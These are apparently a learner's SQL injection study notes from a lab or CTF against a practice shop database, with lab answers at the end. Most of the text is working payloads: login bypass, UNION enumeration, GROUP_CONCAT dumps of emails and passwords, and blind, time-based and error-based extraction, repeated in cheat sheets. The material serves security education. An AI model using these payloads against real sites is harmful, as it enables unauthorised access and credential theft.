- Classic SQLi: `' OR 1=1--`
- ORDER BY: `' ORDER BY 1--`, `' ORDER BY 2--`, `' ORDER BY 3--`
- UNION NULL test: `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`, `' UNION SELECT NULL,NULL,NULL--`
- Find visible columns: `' UNION SELECT 1,2,3,4,5,6,7--`
- Suppress results: `xyzq' UNION SELECT 1,'HACKED',999,4,5,6,7--`
- Database name: `xyzq' UNION SELECT 1,database(),3,4,5,6,7--`
- Version: `xyzq' UNION SELECT 1,version(),3,4,5,6,7--`
- List tables: `xyzq' UNION SELECT 1,TABLE_NAME,3,4,5,6,7 FROM information_schema.tables WHERE TABLE_SCHEMA='quickcart_db'--`
- List columns: `xyzq' UNION SELECT 1,COLUMN_NAME,3,4,5,6,7 FROM information_schema.columns WHERE TABLE_NAME='admin_notes'--`
- Read data: `xyzq' UNION SELECT id,title,3,4,5,6,7 FROM admin_notes ORDER BY 1--`
- Dump everything: `xyzq' UNION SELECT 1,GROUP_CONCAT(CONCAT(email,' : ',password)),3,4,5,6,7 FROM users--`
- Blind SQLi: `' OR (SELECT COUNT(*) FROM users)=10--`
- Character extraction: `' OR SUBSTR(database(),1,1)='q'--`
- Time-based: `' AND IF(SUBSTR(database(),1,1)='q',SLEEP(5),0)--`
- Error-based: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--`


# SQL Injection (SQLi) - Complete Study Notes

---

# 1. What is SQL Injection?

SQL Injection (SQLi) happens when **user input is inserted directly into an SQL query without proper validation or parameterized queries**.

Instead of entering normal data, an attacker enters SQL code, and the database executes it.

Example:

User searches:

```text
laptop
```

Server builds:

```sql
SELECT * FROM products
WHERE name LIKE '%laptop%'
```

---

If the attacker enters:

```text
'
```

The query becomes:

```sql
SELECT * FROM products
WHERE name LIKE '%'
```

The string closes early.

Everything typed afterwards is treated as SQL code.

---

# 2. The Classic SQL Injection Payload

## Payload

```sql
' OR 1=1--
```

Breakdown:

### Step 1 - Close the string

```sql
'
```

Now:

```sql
SELECT * FROM products
WHERE name LIKE '%'
```

---

### Step 2 - Add an always true condition

```sql
OR 1=1
```

Now:

```sql
WHERE name LIKE '%'
OR 1=1
```

Since

```sql
1=1
```

is always true,

every row is returned.

---

### Step 3 - Comment out the rest

```sql
--
```

Final query:

```sql
SELECT * FROM products
WHERE name LIKE '%'
OR 1=1--%'
```

Everything after

```sql
--
```

is ignored.

---

# 3. Other Always True Conditions

Instead of

```sql
1=1
```

you can use

```sql
2=2
```

```sql
5=5
```

```sql
'a'='a'
```

```sql
'batman'='batman'
```

Attackers change these to bypass filters.

---

# 4. Difference Between OR and AND

## OR

```sql
' OR 1=1--
```

Returns **all rows**

---

## AND

```sql
' AND 1=1--
```

Returns only the rows already matching the original query.

AND does **NOT** bypass filters.

---

# 5. Authentication Bypass

Suppose login query is

```sql
SELECT *
FROM users
WHERE email='user@email.com'
AND password='password'
```

---

## Login without knowing credentials

Input:

Email

```sql
' OR 1=1--
```

Password

```
anything
```

Query becomes

```sql
SELECT *
FROM users
WHERE email=''
OR 1=1--'
AND password='anything'
```

Password check disappears.

Logs into the first account.

---

## Login as a specific user

Email

```sql
john@gmail.com'--
```

Password

```
anything
```

Query becomes

```sql
SELECT *
FROM users
WHERE email='john@gmail.com'
```

Password ignored.

---

# 6. Finding the Number of Columns

UNION requires both queries to return the **same number of columns**.

There are two methods.

---

## Method 1 — ORDER BY

Try

```sql
' ORDER BY 1--
```

```sql
' ORDER BY 2--
```

```sql
' ORDER BY 3--
```

...

If

```sql
ORDER BY 7
```

works

and

```sql
ORDER BY 8
```

fails,

then

**Table has 7 columns**

---

## Method 2 — UNION SELECT NULL

Try

```sql
' UNION SELECT NULL--
```

```sql
' UNION SELECT NULL,NULL--
```

```sql
' UNION SELECT NULL,NULL,NULL--
```

Keep adding NULLs until it works.

NULL works because it fits every datatype.

---

# 7. UNION Injection

OR only changes rows.

UNION lets us read another table.

Example

```sql
SELECT name
FROM products

UNION

SELECT email
FROM users
```

Now both product names and emails appear.

---

## Correct Column Count

Works

```sql
SELECT name,price
FROM products

UNION

SELECT email,password
FROM users
```

Fails

```sql
SELECT name
FROM products

UNION

SELECT email,password
FROM users
```

Columns must match.

---

# 8. Finding Which Columns Appear on Screen

Inject

```sql
' UNION SELECT 1,2,3,4,5,6,7--
```

Suppose page shows

Name

```
2
```

Price

```
3
```

Then

Column 2 → Product Name

Column 3 → Price

These are your output columns.

---

# 9. Removing Normal Results

Search something impossible.

Example

```text
xyzq
```

Returns zero products.

Now inject

```sql
xyzq' UNION SELECT 1,2,3,4,5,6,7--
```

Only your injected row appears.

---

Example

```sql
xyzq' UNION SELECT
1,
'HACKED',
999,
4,
5,
6,
7--
```

Shows

Name

```
HACKED
```

Price

```
999
```

---

# 10. Extracting Database Name

Use

```sql
database()
```

Payload

```sql
xyzq'
UNION
SELECT
1,
database(),
3,
4,
5,
6,
7--
```

Example output

```
quickcart_db
```

---

# 11. Database Version

Use

```sql
version()
```

Payload

```sql
xyzq'
UNION
SELECT
1,
version(),
3,
4,
5,
6,
7--
```

Example

```
MySQL 8.0.35
```

---

# 12. Discovering Tables

Use

```sql
information_schema.tables
```

Important columns

```
TABLE_SCHEMA
TABLE_NAME
```

Payload

```sql
xyzq'
UNION
SELECT
1,
TABLE_NAME,
3,
4,
5,
6,
7
FROM information_schema.tables
WHERE TABLE_SCHEMA='quickcart_db'--
```

Example output

```
products

users

orders

admin_notes
```

---

# 13. Discovering Columns

Use

```sql
information_schema.columns
```

Important column

```
COLUMN_NAME
```

Payload

```sql
xyzq'
UNION
SELECT
1,
COLUMN_NAME,
3,
4,
5,
6,
7
FROM information_schema.columns
WHERE TABLE_NAME='admin_notes'--
```

Output

```
id

title

content

created_by

priority
```

---

# 14. Reading Data

Read titles

```sql
xyzq'
UNION
SELECT
id,
title,
3,
4,
5,
6,
7
FROM admin_notes
ORDER BY 1--
```

Read content

```sql
xyzq'
UNION
SELECT
id,
content,
3,
4,
5,
6,
7
FROM admin_notes
ORDER BY 1--
```

ORDER BY keeps rows aligned.

---

# 15. Dump Everything Using group_concat()

Instead of many rows

Combine into one row.

SQLite

```sql
group_concat(title || ' : ' || content)
```

Payload

```sql
xyzq'
UNION
SELECT
1,
group_concat(title || ' : ' || content),
3,
4,
5,
6,
7
FROM admin_notes--
```

---

## MySQL Version

```sql
GROUP_CONCAT(CONCAT(title,' : ',content))
```

Payload

```sql
xyzq'
UNION
SELECT
1,
GROUP_CONCAT(CONCAT(title,' : ',content)),
3,
4,
5,
6,
7
FROM admin_notes--
```

---

# Dump User Emails

SQLite

```sql
group_concat(email)
```

MySQL

```sql
GROUP_CONCAT(email)
```

---

# Dump Email : Password

SQLite

```sql
group_concat(email || ' : ' || password)
```

MySQL

```sql
GROUP_CONCAT(CONCAT(email,' : ',password))
```

Payload

```sql
xyzq'
UNION
SELECT
1,
GROUP_CONCAT(CONCAT(email,' : ',password)),
3,
4,
5,
6,
7
FROM users--
```

---

# 16. Blind SQL Injection

No errors shown.

Only

Login Success

or

Login Failed

Use yes/no questions.

---

Count users

```sql
' OR
(
SELECT COUNT(*)
FROM users
)>9--
```

If success

There are more than 9 users.

---

Confirm exactly 10

```sql
' OR
(
SELECT COUNT(*)
FROM users
)=10--
```

---

# Binary Search

Instead of checking one by one

Use midpoint

```
1000

5000

7500

6250

6875
```

Each question halves the search.

Approximately

```
log₂(N)
```

questions.

For 10,000

≈14 questions.

---

# 17. Character-by-Character Extraction

Use

```sql
SUBSTR()
```

Example

```sql
SUBSTR(database(),1,1)
```

Returns

```
q
```

Payload

```sql
' OR
SUBSTR(database(),1,1)='q'--
```

Then

```sql
SUBSTR(database(),2,1)
```

returns

```
u
```

Continue until entire string extracted.

---

Extract first password

```sql
SUBSTR(
(
SELECT password
FROM users
LIMIT 1
),
1,
1
)
```

LIMIT 1 is required because SUBSTR expects one value.

---

# 18. Time-Based Blind SQLi

When TRUE/FALSE responses look identical.

Use

```sql
SLEEP()
```

Example

```sql
IF(condition,SLEEP(5),0)
```

Payload

```sql
' AND
IF(
SUBSTR(database(),1,1)='q',
SLEEP(5),
0
)--
```

If page delays 5 seconds

Condition is TRUE.

---

# 19. Error-Based SQL Injection

Uses

```sql
EXTRACTVALUE()
```

Payload

```sql
' AND
EXTRACTVALUE(
1,
CONCAT(
0x7e,
(
SELECT database()
)
)
)--
```

Output

```
XPATH syntax error:
~quickcart_db
```

---

Extract Version

```sql
' AND
EXTRACTVALUE(
1,
CONCAT(
0x7e,
(
SELECT version()
)
)
)--
```

---

Extract Table Names

```sql
' AND
EXTRACTVALUE(
1,
CONCAT(
0x7e,
(
SELECT GROUP_CONCAT(table_name)
FROM information_schema.tables
WHERE table_schema=database()
)
)
)--
```

---

Extract Emails

```sql
' AND
EXTRACTVALUE(
1,
CONCAT(
0x7e,
(
SELECT GROUP_CONCAT(email)
FROM users
)
)
)--
```

---

Extract Passwords

```sql
' AND
EXTRACTVALUE(
1,
CONCAT(
0x7e,
(
SELECT GROUP_CONCAT(password)
FROM users
)
)
)--
```

---

# 20. SQLi Attack Order (Remember This!)

```
1. Test for SQL Injection
        '
        "
        #

↓

2. Authentication Bypass
        ' OR 1=1--

↓

3. Find Number of Columns
        ORDER BY
        UNION SELECT NULL

↓

4. Find Visible Columns
        UNION SELECT 1,2,3...

↓

5. Suppress Normal Results
        xyzq'

↓

6. Extract Database Name
        database()

↓

7. Extract Version
        version()

↓

8. Enumerate Tables
        information_schema.tables

↓

9. Enumerate Columns
        information_schema.columns

↓

10. Extract Data
        SELECT column FROM table

↓

11. Dump Everything
        GROUP_CONCAT()

↓

12. Blind SQLi
        COUNT()
        SUBSTR()

↓

13. Time Blind
        IF()
        SLEEP()

↓

14. Error Based
        EXTRACTVALUE()
```

---

# Commands Cheat Sheet (Most Important)

```sql
' OR 1=1--

' AND 1=1--

' ORDER BY 1--

' ORDER BY 2--

' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT 1,2,3,4,5,6,7--

xyzq' UNION SELECT 1,'HACKED',999,4,5,6,7--

database()

version()

information_schema.tables

information_schema.columns

TABLE_NAME

TABLE_SCHEMA

COLUMN_NAME

GROUP_CONCAT()

CONCAT()

SUBSTR()

COUNT()

LIMIT 1

ORDER BY 1

IF()

SLEEP()

EXTRACTVALUE()

0x7e
```

---

# Quick Revision Flow

```text
Test Injection
      │
      ▼
' OR 1=1--
      │
      ▼
Find Columns
(ORDER BY / NULL)
      │
      ▼
Find Visible Columns
(1,2,3...)
      │
      ▼
Suppress Results
(xyzq)
      │
      ▼
database()
      │
      ▼
information_schema.tables
      │
      ▼
information_schema.columns
      │
      ▼
Read Data
      │
      ▼
GROUP_CONCAT()
      │
      ▼
Blind SQLi
(COUNT → SUBSTR)
      │
      ▼
Time Blind
(IF + SLEEP)
      │
      ▼
Error Based
(EXTRACTVALUE)
```

These notes cover the concepts, workflow, and SQL payloads from your lesson in a structured order that's suitable for revision. Use them only in authorized environments such as labs, CTFs, or systems you have explicit permission to test.



































How many columns does the search query return?

' ORDER BY 6--

What is the name of the database?
' UNION SELECT 1,2,3,4,5,6 --
' UNION SELECT 1,database(),3,4,5,6 --

One of the tables in this database stores the accounts of the site's staff. What is the table's name?

auniw' UNION SELECT 1,TABLE_NAME,3,4,5,6 FROM information_schema.tables --

What is the email address of the admin?

auniw' UNION SELECT 1,email,3,4,5,6 FROM tn_staff_accounts-- --

What is the password of the admin?

auniw' UNION SELECT 1,role,3,passwd,5,6 FROM tn_staff_accounts--

Click Sign In (top-right of the site), enter the admin's email and password. What is the flag?


column count → database name → table enumeration → column enumeration → email → password → access.

In **blind** SQL injection, how do you extract data?

'OR (SELECT COUNT(<star>) FROM users)>9--

Write the payload that confirms the exact user count is **10**.
'OR (SELECT COUNT(*) FROM users)==10--

**This works for any string in the database.** Just change what's inside SUBSTR:


Database name:
' OR SUBSTR(database(),1,1) = 'q'--

First user's password:
' OR SUBSTR((SELECT password FROM users LIMIT 1),1,1) = 'a'--

Email of user with id=1:
' OR SUBSTR((SELECT email FROM users WHERE id=1),1,1) = 'j'--
### The scale problem

Testing a–z and 0–9 is **36 possibilities** per character. Add special characters (`! @ # $ %`) and it's 60+. A 12-character password could take **700+ attempts.** Multiply across many users : it's thousands of requests.

This is why automated tools like **sqlmap** exist.

Give it a vulnerable URL and it runs every request automatically : testing characters, binary searching, extracting data. And hands you the results in seconds.

Write the payload that tests if the first character of the database name is `'q'` using a 5-second delay

' AND IF(SUBSTR(database(),1,1)='q', SLEEP(5), 0)--


MySQL has a function called `EXTRACTVALUE(xml_data, xpath_query)`. You don't need to know what those parameters mean. What matters: when you give it an **invalid xpath_query**, MySQL throws an error that **quotes your invalid query back to you.** A valid XPath starts with `/`. The `~` character is unrecognised, so `~anything` is always invalid.

The payload:

' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--

- ▸`SELECT database()` : returns the database name, e.g. `quickcart_db`
- ▸`0x7e` : hex code for `~`. Using hex avoids quoting issues and bypasses basic filters
- ▸`CONCAT(0x7e, (SELECT database()))` → `~quickcart_db`
- ▸`~quickcart_db` is **invalid XPath** : MySQL's parser rejects it and throws an error
- ▸`EXTRACTVALUE(1, ...)` : the `1` is a placeholder. The function crashes on the XPath before it ever reads the first argument

The error

XPATH syntax error: '~quickcart_db'

Database version:
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
Error: '~8.0.32-MySQL Community Server'

All table names:
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
Error: '~users,products,orders,admin_notes'

All emails:
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT group_concat(email) FROM users)))--
Error: '~alice@example.com,bob@example.com,carol@example.com'

All passwords:
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT group_concat(password) FROM users)))--
Error: '~hunter2,p@ssw0rd,securepass99'

Error-based has one hard requirement: the application must **display database errors** on the page. If a developer catches errors and shows a generic message, this technique gives you nothing.

### ▸The attacker's playbook, in order

- ▸**UNION-based** : fastest. Full rows returned directly in the page. Try first.
- ▸**Error-based** : fast. Data in error messages. Only if errors are visible.
- ▸**Boolean blind** : slow. One yes/no per request. Works with minimal feedback.
- ▸**Time-based blind** : slowest. Response delay as the signal. Last resort.



![[Pasted image 20260705232701.png]]

![[Pasted image 20260705232921.png]]


